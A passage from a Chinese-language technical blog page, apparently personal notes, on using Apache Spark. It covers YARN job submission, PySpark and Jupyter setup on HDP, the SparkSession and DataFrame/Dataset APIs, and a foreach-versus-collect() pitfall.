18/01/17 15:21:30 INFO AbstractConnector: Stopped Spark@17b03218{HTTP/1.1,[http/1.1]}{0.0.0.0:4042}
18/01/17 15:21:30 INFO SparkUI: Stopped Spark web UI at http://192.168.1.5:4042
18/01/17 15:21:30 INFO YarnClientSchedulerBackend: Interrupting monitor thread
18/01/17 15:21:30 INFO YarnClientSchedulerBackend: Shutting down all executors
18/01/17 15:21:30 INFO YarnSchedulerBackend$YarnDriverEndpoint: Asking each executor to shut down
18/01/17 15:21:30 INFO SchedulerExtensionServices: Stopping SchedulerExtensionServices
(serviceOption=None,
 services=List(),
 started=false)
18/01/17 15:21:30 INFO YarnClientSchedulerBackend: Stopped
18/01/17 15:21:30 INFO MapOutputTrackerMasterEndpoint: MapOutputTrackerMasterEndpoint stopped!
18/01/17 15:21:31 INFO MemoryStore: MemoryStore cleared
18/01/17 15:21:31 INFO BlockManager: BlockManager stopped
18/01/17 15:21:31 INFO BlockManagerMaster: BlockManagerMaster stopped
18/01/17 15:21:31 INFO OutputCommitCoordinator$OutputCommitCoordinatorEndpoint: OutputCommitCoordinator stopped!
18/01/17 15:21:31 INFO SparkContext: Successfully stopped SparkContext
18/01/17 15:21:31 INFO ShutdownHookManager: Shutdown hook called
18/01/17 15:21:31 INFO ShutdownHookManager: Deleting directory /tmp/spark-730219ef-2995-4225-8743-5769fa6269db
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&amp;ndash;master: 指定spark driver的运行模式。
&lt;ul&gt;
&lt;li&gt;yarn-cluster: spark driver运行在yarn的application master进程中。如果应用只是进行计算可以使用这种方式运行，如果需要跟前台进行交互则可以考虑yarn-client模式。&lt;/li&gt;
&lt;li&gt;yarn-client: spark driver运行在client进程中，此时application master只负责向yarn申请资源。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;使用python进行开发&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bd%bf%e7%94%a8python%e8%bf%9b%e8%a1%8c%e5%bc%80%e5%8f%91&#34;&gt;
        #
    &lt;/a&gt;
    使用python进行开发
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;使用hdp环境提交任务&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bd%bf%e7%94%a8hdp%e7%8e%af%e5%a2%83%e6%8f%90%e4%ba%a4%e4%bb%bb%e5%8a%a1&#34;&gt;
        ##
    &lt;/a&gt;
    使用HDP环境提交任务
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;创建python文件&lt;code&gt;pi.py&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import sys
from random import random
from operator import add

from pyspark.sql import SparkSession

spark = SparkSession.builder.appName(&amp;quot;PythonPi&amp;quot;)\.getOrCreate()

partitions = int(sys.argv[1]) if len(sys.argv) &amp;gt; 1 else 2
n = 100000 * partitions

def f(any):
    x = random() * 2 - 1
    y = random() * 2 - 1
    return 1 if x ** 2 + y ** 2 &amp;lt;= 1 else 0

count = spark.sparkContext.parallelize(range(1, n + 1), partitions).map(f).reduce(add)
print(&amp;quot;Pi is roughly %f&amp;quot; % (4.0 * count / n))

spark.stop()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;运行&lt;code&gt;pi.py&lt;/code&gt;，这里指定使用yarn的cluster模式&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SPARK_MAJOR_VERSION=2 spark-submit --master yarn --deploy-mode cluster --driver-memory 512m --executor-memory 512m --deploy pi.py 10
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;在hdp环境运行jupyter-server&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%9c%a8hdp%e7%8e%af%e5%a2%83%e8%bf%90%e8%a1%8cjupyter-server&#34;&gt;
        ##
    &lt;/a&gt;
    在HDP环境运行jupyter server
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;使用yarn的cluster模式运行，在运行期间会始终在yarn中占用资源，如果需要长期运行，使用&lt;code&gt;--master local&lt;/code&gt;比较好&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;XDG_RUNTIME_DIR=&amp;quot;&amp;quot; SPARK_MAJOR_VERSION=2 PYSPARK_DRIVER_PYTHON=jupyter PYSPARK_DRIVER_PYTHON_OPTS=&#39;notebook --no-browser --port 8888 --ip 121.43.171.231&#39; pyspark --master yarn --deploy-mode cluster --driver-memory 512m --executor-memory 512m
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;为jupyter server设置密码等操作参考&lt;a href=&#34;https://jupyter-notebook.readthedocs.io/en/stable/public_server.html&#34;&gt;jupyter文档&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;运行后访问服务器8888端口即可访问jupyter服务&lt;/p&gt;
&lt;h3 id=&#34;非hdp环境开发&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%9d%9ehdp%e7%8e%af%e5%a2%83%e5%bc%80%e5%8f%91&#34;&gt;
        ##
    &lt;/a&gt;
    非HDP环境开发
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;确保本机有一份spark二进制文件，比如&lt;code&gt;spark-2.2.1-bin-hadoop2.7&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;安装pyspark&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pip install pyspark
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;设置SPARK_HOME（可选）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;export SPARK_HOME=/home/xxx/spark-2.2.1-bin-hadoop2.7
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过代码提交任务&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import os
from pyspark import SparkConf, SparkContext

# if `SPARK_HOME` is undefined yet
if &#39;SPARK_HOME&#39; not in os.environ:
    os.environ[&#39;SPARK_HOME&#39;] = &#39;/home/xxx/spark-2.2.1-bin-hadoop2.7&#39;

conf = SparkConf().setAppName(&#39;Demo&#39;).setMaster(&#39;yarn&#39;).set(&#39;spark.yarn.deploy.mode&#39;, &#39;cluster&#39;)
sc = SparkContext(conf=conf)

# Do something with sc...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者使用&lt;code&gt;SparkSession&lt;/code&gt; API&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from spark.sql import SparkSession
spark = (SparkSession.builder
          .master(&amp;quot;yarn&amp;quot;)
          .appName(&amp;quot;Demo&amp;quot;)
          .config(&amp;quot;spark.yarn.deploy.mode&amp;quot;, &amp;quot;cluster&amp;quot;)
          .getOrCreate())

# Do something with spark...
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;oozie自动化&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#oozie%e8%87%aa%e5%8a%a8%e5%8c%96&#34;&gt;
        ##
    &lt;/a&gt;
    oozie自动化
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;TODO&lt;/p&gt;
&lt;h1 id=&#34;development&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#development&#34;&gt;
        ##
    &lt;/a&gt;
    Development
&lt;/div&gt;
&lt;/h1&gt;
&lt;p&gt;Spark 2.0之前的开发接口主要是RDD（Resilient Distributed Dataset），从2.0之后原有&lt;a href=&#34;https://spark.apache.org/docs/latest/rdd-programming-guide.html&#34;&gt;RDD接口&lt;/a&gt;仍然支持，但RDD被Dataset取代，如果使用Dataset编程的话需要使用&lt;a href=&#34;https://spark.apache.org/docs/latest/sql-programming-guide.html&#34;&gt;Spark SQL&lt;/a&gt;。&lt;/p&gt;
&lt;h2 id=&#34;api&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#api&#34;&gt;
        #
    &lt;/a&gt;
    API
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://spark.apache.org/docs/1.3.1/api/scala/index.html&#34;&gt;http://spark.apache.org/docs/1.3.1/api/scala/index.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;sparksession-vs-sparkcontext&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#sparksession-vs-sparkcontext&#34;&gt;
        #
    &lt;/a&gt;
    SparkSession vs SparkContext
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;Spark 2.0之前有3个主要的连接对象：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SparkContext: 建立与Spark执行环境相关的连接，用于创建RDD&lt;/li&gt;
&lt;li&gt;SqlContext：利用SparkContext背后的SparkSQL建立连接&lt;/li&gt;
&lt;li&gt;HiveContext：创建访问hive的接口&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;从Spark 2.0开始，Datasets/Dataframes成为主要的数据访问接口，SparkSession(org.apache.spark.sql.SparkSession)成为主要的访问Spark执行环境的接口。&lt;/p&gt;
&lt;h3 id=&#34;sparkconf&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#sparkconf&#34;&gt;
        ##
    &lt;/a&gt;
    SparkConf
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;Spark 2.0之前需要先创建SparkConf，在创建SparkContext。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
//set up the spark configuration and create contexts
val sparkConf = new SparkConf().setAppName(&#34;SparkSessionZipsExample&#34;).setMaster(&#34;local&#34;)
// your handle to SparkContext to access other context like SQLContext
val sc = new SparkContext(sparkConf).set(&#34;spark.some.config.option&#34;, &#34;some-value&#34;)
val sqlContext = new org.apache.spark.sql.SQLContext(sc)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Spark 2.0之后可以不用显示的创建SparkConf对象就可以创建SparkSession对象。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
// Create a SparkSession. No need to create SparkContext
// You automatically get it as part of the SparkSession
val warehouseLocation = &#34;file:${system:user.dir}/spark-warehouse&#34;
val spark = SparkSession
   .builder()
   .appName(&#34;SparkSessionZipsExample&#34;)
   .config(&#34;spark.sql.warehouse.dir&#34;, warehouseLocation)
   .enableHiveSupport()
   .getOrCreate()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在SparkSession创建完后，Spark的运行时配置属性还可以通过SparkSession.conf()被修改：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
//set new runtime options
spark.conf.set(&#34;spark.sql.shuffle.partitions&#34;, 6)
spark.conf.set(&#34;spark.executor.memory&#34;, &#34;2g&#34;)
//get all settings
val configMap:Map[String, String] = spark.conf.getAll()
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://blog.javachen.com/2015/06/07/spark-configuration.html&#34;&gt;Spark conf参考&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;sparksql&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#sparksql&#34;&gt;
        ##
    &lt;/a&gt;
    SparkSQL
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;2.0之前需要通过创建SqlContext来使用SparkSQL。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
val sc = new SparkContext(sparkConf).set(&#34;spark.some.config.option&#34;, &#34;some-value&#34;)
val sqlContext = new org.apache.spark.sql.SQLContext(sc)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;2.0后通过SparkSession可以很方便的访问SparkSession.sql()来使用SparkSQL。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
// Now create an SQL table and issue SQL queries against it without
// using the sqlContext but through the SparkSession object.
// Creates a temporary view of the DataFrame
zipsDF.createOrReplaceTempView(&#34;zips_table&#34;)
zipsDF.cache()
val resultsDF = spark.sql(&#34;SELECT city, pop, state, zip FROM zips_table&#34;)
resultsDF.show(10)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;访问catalog-metadata&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e8%ae%bf%e9%97%aecatalog-metadata&#34;&gt;
        ##
    &lt;/a&gt;
    访问Catalog Metadata
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;SparkSession暴露了访问metastore的接口SparkSession.catalog，这个接口可以用来访问catalog metadata信息，比如（Hcatalog）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
//fetch metadata data from the catalog
spark.catalog.listDatabases.show(false)
spark.catalog.listTables.show(false)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;
scala&gt; spark.catalog.listDatabases.show(false)
+-------+---------------------+------------------------------------------+
|name   |description          |locationUri                               |
+-------+---------------------+------------------------------------------+
|default|Default Hive database|hdfs://bdtest-001:8020/apps/hive/warehouse|
+-------+---------------------+------------------------------------------+

scala&gt; spark.catalog.listTables.show(false)
+-------------------------+--------+----------------------------------------+---------+-----------+
|name                     |database|description                             |tableType|isTemporary|
+-------------------------+--------+----------------------------------------+---------+-----------+
|activity_donate_record   |default |Imported by sqoop on 2018/01/08 19:03:33|MANAGED  |false      |
|activity_periods_config  |default |Imported by sqoop on 2018/01/08 19:04:20|MANAGED  |false      |
|activity_result          |default |Imported by sqoop on 2018/01/08 19:05:00|MANAGED  |false      |
|activity_school_info     |default |Imported by sqoop on 2018/01/08 19:05:46|MANAGED  |false      |
|activity_season_game_data|default |Imported by sqoop on 2018/01/08 19:06:23|MANAGED  |false      |
|activity_season_game_log |default |Imported by sqoop on 2018/01/08 19:07:00|MANAGED  |false      |
|ana_tag                  |default |Imported by sqoop on 2018/01/08 19:07:35|MANAGED  |false      |
|ana_user_tag             |default |Imported by sqoop on 2018/01/08 19:08:18|MANAGED  |false      |
|api_invoking_log         |default |Imported by sqoop on 2018/01/08 19:08:58|MANAGED  |false      |
|app_function             |default |Imported by sqoop on 2018/01/08 19:09:34|MANAGED  |false      |
|bank_card                |default |Imported by sqoop on 2018/01/08 19:10:09|MANAGED  |false      |
|bank_card_bin            |default |Imported by sqoop on 2018/01/08 19:10:46|MANAGED  |false      |
|command_invocation       |default |Imported by sqoop on 2018/01/08 19:11:26|MANAGED  |false      |
|coupon_grant_log         |default |Imported by sqoop on 2018/01/08 19:12:05|MANAGED  |false      |
|coupon_user              |default |Imported by sqoop on 2018/01/08 19:12:43|MANAGED  |false      |
|device_command           |default |Imported by sqoop on 2018/01/08 19:13:18|MANAGED  |false      |
|device_preorder          |default |Imported by sqoop on 2018/01/08 19:13:54|MANAGED  |false      |
|dro_dropdetails          |default |null                                    |MANAGED  |false      |
|dro_dropinfo             |default |Imported by sqoop on 2018/01/08 19:15:09|MANAGED  |false      |
|dro_exchange_record      |default |Imported by sqoop on 2018/01/08 19:15:43|MANAGED  |false      |
+-------------------------+--------+----------------------------------------+---------+-----------+
only showing top 20 rows
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;dataframe-和-datasets&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#dataframe-%e5%92%8c-datasets&#34;&gt;
        #
    &lt;/a&gt;
    DataFrame 和 Datasets
&lt;/div&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://databricks.com/wp-content/uploads/2016/06/Unified-Apache-Spark-2.0-API-1.png&#34; alt=&#34;DataFrame &amp;amp; Dataset&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;dataset&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#dataset&#34;&gt;
        ##
    &lt;/a&gt;
    Dataset：
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;强类型&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;支持functional和relational操作&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;操作分类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;转换（transformation）：用于产生新的Datasets
&lt;ul&gt;
&lt;li&gt;例如：map，filter，select，aggregate（groupBy）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;操作（actions）：触发计算并返回结果
&lt;ul&gt;
&lt;li&gt;例如：count，show，把数据写回文件系统&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;lazy：计算只有到action触发的时候才进行。Dataset内部可以理解为存储了如何进行计算的计划。当action执行的时候Spark query optimizer生成并优化计算方案后将其执行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&#34;http://spark.apache.org/docs/latest/api/scala/index.html#org.apache.spark.sql.Encoder&#34;&gt;Encoder&lt;/a&gt;：把JVM中的类型T跟Spark SQL的数据表现形式进行转换的机制。（marshal/unmarshal?）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;两种创建方法：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;使用SparkSession的read()方法&lt;/p&gt;
  &lt;pre&gt;&lt;code&gt;
  val people = spark.read.parquet(&#34;...&#34;).as[Person]  // Scala
  Dataset&lt;Person&gt; people = spark.read().parquet(&#34;...&#34;).as(Encoders.bean(Person.class)); // Java
  &lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;对现有Dataset做转换（transformation）&lt;/p&gt;
  &lt;pre&gt;&lt;code&gt;
  val names = people.map(_.name)  // in Scala; names is a Dataset[String]
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Dataset&lt;String&gt; names = people.map((Person p) -&amp;gt; p.name, Encoders.STRING));
&lt;/code&gt;&lt;/pre&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Dataset操作也可以是untyped，通过：&lt;a href=&#34;http://spark.apache.org/docs/latest/api/scala/index.html#org.apache.spark.sql.Dataset&#34;&gt;Dataset&lt;/a&gt;, &lt;a href=&#34;http://spark.apache.org/docs/latest/api/scala/index.html#org.apache.spark.sql.Column&#34;&gt;Column&lt;/a&gt;, &lt;a href=&#34;http://spark.apache.org/docs/latest/api/scala/index.html#org.apache.spark.sql.functions$&#34;&gt;DataFrame的function&lt;/a&gt;等。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;列操作&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;选择一列（抛弃其他列）：select(&amp;ldquo;column&amp;rdquo;)&lt;/li&gt;
&lt;li&gt;增加一列：withColumn(&amp;ldquo;newColumn&amp;rdquo;, Column)&lt;/li&gt;
&lt;li&gt;修改一列: withColumn(&amp;ldquo;column&amp;rdquo;, Column)&lt;/li&gt;
&lt;li&gt;删除一列: drop(&amp;ldquo;column&amp;rdquo;)&lt;/li&gt;
&lt;li&gt;类型转换：&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;列高级操作：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;UDF:&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dataframe&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#dataframe&#34;&gt;
        ##
    &lt;/a&gt;
    DataFrame：
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Dataset的无类型view (untyped view)，对应Dataset的Row&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://spark.apache.org/docs/latest/api/scala/index.html#org.apache.spark.sql.functions$&#34;&gt;DataFrame操作Functions&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;DataFrame是有名列（named columns）组成的数据集合，类似关系数据库中的表或者python/R中的pandas。&lt;/p&gt;
&lt;p&gt;可以由多种数据源来构造DataFrame，比如Hive中的table，Spark的RDD（Resilient Distributed Datasets）。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;TODO: Datasets&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;SparkSession有很多种方法创建DataFrame和Datasets。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;DataFrame&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;创建API&lt;/td&gt;
&lt;td&gt;SparkSession.createDataFrame&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;访问&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;其他&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;Datasets&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;创建API&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;访问&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;其他&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;rowhttpsparkapacheorgdocslatestapiscalaindexhtmlorgapachesparksqlrow&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#rowhttpsparkapacheorgdocslatestapiscalaindexhtmlorgapachesparksqlrow&#34;&gt;
        ##
    &lt;/a&gt;
    &lt;a href=&#34;http://spark.apache.org/docs/latest/api/scala/index.html#org.apache.spark.sql.Row&#34;&gt;Row&lt;/a&gt;
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;创建Row&lt;/li&gt;
&lt;li&gt;访问
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;generic访问，使用ordinal序列访问&lt;/p&gt;
&lt;p&gt;row(0)：访问列第一个成员&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;原始类型访问&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;columnhttpsparkapacheorgdocslatestapiscalaindexhtmlorgapachesparksqlcolumn&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#columnhttpsparkapacheorgdocslatestapiscalaindexhtmlorgapachesparksqlcolumn&#34;&gt;
        ##
    &lt;/a&gt;
    &lt;a href=&#34;http://spark.apache.org/docs/latest/api/scala/index.html#org.apache.spark.sql.Column&#34;&gt;Column&lt;/a&gt;
&lt;/div&gt;
&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;DataSet API:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&#34;http://spark.apache.org/docs/latest/api/scala/index.html#org.apache.spark.sql.Dataset&#34;&gt;http://spark.apache.org/docs/latest/api/scala/index.html#org.apache.spark.sql.Dataset&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;处理时间&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%a4%84%e7%90%86%e6%97%b6%e9%97%b4&#34;&gt;
        ##
    &lt;/a&gt;
    处理时间
&lt;/div&gt;
&lt;/h3&gt;
&lt;h4 id=&#34;-ver--15&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#-ver--15&#34;&gt;
        ###
    &lt;/a&gt;
    * ver &amp;lt;= 1.5
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;使用hiveContext来查询&lt;/p&gt;
&lt;h4 id=&#34;--15--ver--22&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#--15--ver--22&#34;&gt;
        ###
    &lt;/a&gt;
    *  1.5 &amp;lt;= ver &amp;lt; 2.2
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;Spark 1.5引入了unix_timestamp()，所以在1.5之后到2.2的spark版本中可以这样操作时间信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
import org.apache.spark.sql.functions.{unix_timestamp, to_date}

val df = Seq((1L, &#34;01-APR-2015&#34;)).toDF(&#34;id&#34;, &#34;ts&#34;)

df.select(to_date(unix_timestamp(
  $&#34;ts&#34;, &#34;dd-MMM-yyyy&#34;
).cast(&#34;timestamp&#34;)).alias(&#34;timestamp&#34;))
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;-ver--22&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#-ver--22&#34;&gt;
        ###
    &lt;/a&gt;
    * ver &amp;gt;= 2.2
&lt;/div&gt;
&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;
import org.apache.spark.sql.functions.{to_date, to_timestamp}

df.select(to_date($&#34;ts&#34;, &#34;dd-MMM-yyyy&#34;).alias(&#34;date&#34;))

df.select(to_timestamp($&#34;ts&#34;, &#34;dd-MM-yyyy HH:mm:ss&#34;).alias(&#34;timestamp&#34;))
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;import-sparkimplicits_&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#import-sparkimplicits_&#34;&gt;
        ##
    &lt;/a&gt;
    import spark.implicits._
&lt;/div&gt;
&lt;/h3&gt;
&lt;p&gt;引入toDF()方法和“$”操作符&lt;/p&gt;
&lt;h2 id=&#34;编程陷阱&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e7%bc%96%e7%a8%8b%e9%99%b7%e9%98%b1&#34;&gt;
        #
    &lt;/a&gt;
    编程陷阱
&lt;/div&gt;
&lt;/h2&gt;
&lt;h3 id=&#34;陷阱1dataframe有元素但通过循环把值放入listbuffer后listbuffer却为空列表&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e9%99%b7%e9%98%b11dataframe%e6%9c%89%e5%85%83%e7%b4%a0%e4%bd%86%e9%80%9a%e8%bf%87%e5%be%aa%e7%8e%af%e6%8a%8a%e5%80%bc%e6%94%be%e5%85%a5listbuffer%e5%90%8elistbuffer%e5%8d%b4%e4%b8%ba%e7%a9%ba%e5%88%97%e8%a1%a8&#34;&gt;
        ##
    &lt;/a&gt;
    陷阱1：dataframe有元素，但通过循环把值放入ListBuffer()后ListBuffer()却为空列表
&lt;/div&gt;
&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;
   val valueDF = allData.select(&#34;value&#34;).distinct()
    valueDF.show()
    //valueDF.foreach(r =&gt; valueList.append(r.getAs[Int](&#34;value&#34;)))

    for (row &lt;- valueDF) {
      println(&#34;value:&#34; + row.getAs[Int](&#34;value&#34;))
      valueList.append(row.getAs[Int](&#34;value&#34;))
    }
    println(&#34;Values:&#34; + valueList)
    valueList.foreach(println))

// 程序运行输出

+-------+
|value  |
+-------+
|      1|
|      3|
|      5|
|      4|
|     10|
|      2|
|      0|
+-------+

Values:ListBuffer()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看出两个问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;问题1: 虽然可以知道valueDF不为空，可是&amp;quot;println(&amp;hellip;)&amp;ldquo;却没有任何输出内容&lt;/li&gt;
&lt;li&gt;问题2: 结果valueList为空&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;原因&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e5%8e%9f%e5%9b%a0&#34;&gt;
        ###
    &lt;/a&gt;
    原因：
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;Spark任务执行是通过Driver/Executor来完成的，Driver控制任务执行，Executor负责任务执行，foreach/for会被Driver分配给Executor来执行（分布式执行），每个Executor创建一个自己的ListBuffer拷贝，因此当任务结束后信息就丢失了。&lt;/p&gt;
&lt;p&gt;参考Stackoverflow的讨论：&lt;a href=&#34;https://stackoverflow.com/questions/36203299/scala-listbuffer-emptying-itself-after-every-add-in-loop&#34;&gt;https://stackoverflow.com/questions/36203299/scala-listbuffer-emptying-itself-after-every-add-in-loop&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;修复方法使用collect&#34; &gt;
&lt;div&gt;
    &lt;a href=&#34;#%e4%bf%ae%e5%a4%8d%e6%96%b9%e6%b3%95%e4%bd%bf%e7%94%a8collect&#34;&gt;
        ###
    &lt;/a&gt;
    修复方法：使用collect()
&lt;/div&gt;
&lt;/h4&gt;
&lt;p&gt;collect()定义：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
def collect(): Array[T]
Returns an array that contains all rows in this Dataset.
Running collect requires moving all the data into the application&#39;s driver
process, and doing so on a very large dataset can crash the driver process with
OutOfMemoryError.
For Java API, use collectAsList.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修复代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
val valueDF = allData.select(&#34;value&#34;).distinct()
valueDF.show()
//valueDF.foreach(r =&gt; valueList.append(r.getAs[Int](&#34;value&#34;)))

for (row &lt;- valueDF.collect()) {
  println(&#34;value:&#34; + row.getAs[Int](&#34;value&#34;))
  valueList.append(row.getAs[Int](&#34;value&#34;))
}
println(&#34;getAllChannels:&#34; + valueList)


// 程序运行输出如下

+-------+
|value  |
+-------+
|      1|
|      3|
|      5|
|      4|
|     10|
|      2|
|      0|
+-------+

